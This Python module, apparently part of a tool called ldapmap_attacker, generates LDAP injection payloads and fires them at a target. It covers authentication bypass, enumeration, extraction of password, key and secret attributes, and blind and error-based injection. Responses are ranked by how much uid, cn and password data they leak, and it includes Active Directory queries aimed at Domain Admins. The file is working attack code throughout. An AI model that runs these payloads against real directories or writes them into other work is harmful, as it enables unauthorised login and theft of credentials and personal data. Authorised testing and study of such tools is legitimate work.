import time

from ldapmap_attacker.lib.logger import setup_logger

logger = setup_logger()


class LDAPPayloadCatalog:
    def __init__(self, exploiter):
        self.exploiter = exploiter
        self.effective_payloads = []

    def make_strings(self, technique="all"):
        logger.info(f"Generating LDAP payloads for technique '{technique}'...")

        payloads = []
        if technique in ["all", "auth_bypass"]:
            payloads.extend(self._authentication_bypass_payloads())
        if technique in ["all", "enumeration"]:
            payloads.extend(self._enumeration_payloads())
        if technique in ["all", "extraction"]:
            payloads.extend(self._data_extraction_payloads())
        if technique in ["all", "blind"]:
            payloads.extend(self._blind_payloads())
        if technique in ["all", "error_based"]:
            payloads.extend(self._error_based_payloads())

        return list(dict.fromkeys(payloads))

    def _authentication_bypass_payloads(self):
        base_identities = ["admin", "administrator", "root", "*", "", "null", "1=1"]
        wildcard_variants = ["*", "*)((*", "*))((", ")(*)(", "*)("]
        boolean_operators = ["&", "|", "!"]
        payloads = set()

        for identity in base_identities:
            for wildcard in wildcard_variants:
                payloads.add(f"{identity}{wildcard}")
                payloads.add(f"{wildcard}{identity}")
                for operator in boolean_operators:
                    payloads.add(f"{identity})({operator}(objectClass=*)")
                    payloads.add(f"{identity})({operator}(uid=*)")

        payloads.update(
            {
                "*)(uid=*))(&(uid=*",
                "*))(&(objectClass=*)",
                "*)(objectClass=*))(&(uid=*",
            }
        )
        return sorted(payloads)

    def _enumeration_payloads(self):
        attributes = ["uid", "cn", "sAMAccountName", "mail", "ou", "memberOf", "objectClass"]
        object_classes = ["person", "user", "inetOrgPerson", "organizationalPerson", "posixAccount"]
        payloads = []

        for attribute in attributes:
            payloads.append(f"({attribute}=*)")
            payloads.append(f"*)({attribute}=*")

        for object_class in object_classes:
            payloads.append(f"(objectClass={object_class})")
            payloads.append(f"(&(objectClass={object_class})(uid=*))")

        for numeric_prefix in range(1, 10):
            payloads.append(f"(uidNumber={numeric_prefix}*)")
            payloads.append(f"(gidNumber={numeric_prefix}*)")

        return payloads

    def _data_extraction_payloads(self):
        sensitive_attributes = [
            "userPassword",
            "password",
            "unicodePwd",
            "ntPassword",
            "lmPassword",
            "sshKey",
            "apiKey",
            "secret",
            "privateKey",
            "certificate",
        ]

        payloads = []
        for attribute in sensitive_attributes:
            payloads.append(f"({attribute}=*)")
            payloads.append(f"*)({attribute}=*")
            payloads.append(f"(&({attribute}=*)(uid=*))")

        return payloads

    def _blind_payloads(self):
        timing_payloads = [
            "(&(objectClass=*)(|(objectClass=*)(uid=*)))",
            "*)(uid=*))(&(objectClass=*",
            "*)(objectClass=*))(&(uid=*",
        ]
        boolean_payloads = [
            "(uid=admin)(uid=*)",
            "(cn=admin)(cn=*)",
            "(&(uid=*)(uid=*))",
        ]
        return timing_payloads + boolean_payloads

    def _error_based_payloads(self):
        return [
            "(",
            ")",
            "(()",
            "())",
            "((",
            "))",
            "(&",
            "(|",
            "(!",
            "(=",
            "=*",
            "(*)",
            ")(*)(",
            "objectClass=)(",
            "uid=)(",
        ]

    def _classify_vulnerability(self, response_text):
        content = response_text.lower()
        error_keywords = [
            "invalid syntax",
            "filter error",
            "ldap error",
            "operations error",
            "protocol error",
            "no such object",
            "unwilling to perform",
        ]

        if any(keyword in content for keyword in error_keywords):
            return "error_based"
        if "uid=" in content and "cn=" in content:
            return "information_disclosure"
        if len(response_text) > 2000:
            return "bulk_disclosure"
        return None

    def test_strings(self, payloads):
        logger.info("Testing LDAP payload effectiveness...")

        results = []
        for payload in payloads:
            time.sleep(0.1)
            start_time = time.time()
            response = self.exploiter._make_request(payload)
            response_time = time.time() - start_time

            if not response:
                continue

            result = {
                "payload": payload,
                "response_length": len(response),
                "response_time": response_time,
                "effectiveness_score": self._calculate_score(response, response_time),
                "classification": self._classify_vulnerability(response),
            }
            results.append(result)

        results.sort(key=lambda item: item["effectiveness_score"], reverse=True)
        self.effective_payloads = results[:20]
        return self.effective_payloads

    def _calculate_score(self, response_text, response_time):
        score = 0
        if len(response_text) > 1000:
            score += 10
        if len(response_text) > 5000:
            score += 20
        if "uid=" in response_text.lower():
            score += 15
        if "cn=" in response_text.lower():
            score += 10
        if "password" in response_text.lower():
            score += 25
        if "mail=" in response_text.lower():
            score += 5
        if response_time > 2.0:
            score += 5
        return score

    def get_best_for_tgt(self, target_type="generic"):
        optimized = {
            "active_directory": [
                "(sAMAccountName=*)",
                "(userPrincipalName=*)",
                "(&(objectClass=user)(sAMAccountName=*))",
                "(memberOf=cn=Domain Admins*)",
            ],
            "openldap": [
                "(uid=*)",
                "(objectClass=inetOrgPerson)",
                "(objectClass=posixAccount)",
                "(&(uid=*)(objectClass=person))",
            ],
            "generic": [
                "(uid=*)",
                "(cn=*)",
                "(mail=*)",
                "(objectClass=*)",
            ],
        }
        return optimized.get(target_type, optimized["generic"])


InjStringMaker = LDAPPayloadCatalog
